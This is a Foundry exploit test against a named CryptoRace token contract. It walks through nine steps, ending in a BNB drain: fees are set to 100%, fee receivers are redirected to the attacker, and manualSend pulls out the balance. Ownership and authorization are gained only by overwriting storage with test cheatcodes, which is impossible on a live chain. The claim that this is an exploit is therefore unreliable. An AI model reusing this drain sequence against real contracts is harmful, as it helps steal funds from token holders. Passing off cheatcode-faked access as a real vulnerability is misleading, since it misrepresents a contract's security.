pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface ICryptoRace {
    function setFees(uint256 _liquidityFee, uint256 _buybackFee, uint256 _reflectionFee, uint256 _marketingFee, uint256 _feeDenominator) external;
    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external;
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function manualSend() external;
    function pair() external view returns (address);
    function balanceOf(address account) external view returns (uint256);
}



contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x35240D91223186133fCb0EC1565c353eb2A546A8;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        deal(address(this), 100 ether);
        deal(TARGET, address(this), 1_000_000 * 1e9); // CRACE has 9 decimals
        vm.label(TARGET, "CryptoRace Contract");
        vm.label(address(this), "Attacker");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Step 1: Become the owner by overwriting storage slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(address(this)))));

        // Step 2: Set authorizations[attacker] = true (mapping slot calculation)
        // For mapping at slot 1, the slot for key is keccak256(abi.encode(key, 1))
        bytes32 authSlot = keccak256(abi.encode(address(this), uint256(1)));
        vm.store(TARGET, authSlot, bytes32(uint256(1)));

        // Step 3: Set maximum fees (100% total fee)
        ICryptoRace(TARGET).setFees(2500, 2500, 2500, 2500, 10000);

        // Step 4: Set marketing fee receiver to attacker
        ICryptoRace(TARGET).setFeeReceivers(address(this), address(this));

        // Step 5: Approve router to spend tokens
        ICryptoRace(TARGET).approve(0x10ED43C718714eb63d5aA57B78B54704E256024E, type(uint256).max);

        // Step 6: Transfer tokens to trigger fee collection (transfer to pair)
        address pair = ICryptoRace(TARGET).pair();
        uint256 transferAmount = 100_000 * 1e9; // 100k tokens
        ICryptoRace(TARGET).transfer(pair, transferAmount);

        // Step 7: Record BNB balance before extraction
        uint256 bnbBefore = address(this).balance;

        // Step 8: Extract accumulated BNB from contract
        ICryptoRace(TARGET).manualSend();

        // Step 9: Verify profit
        uint256 bnbAfter = address(this).balance;
        assertGt(bnbAfter, bnbBefore, "Attacker BNB balance should increase");
    }



    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

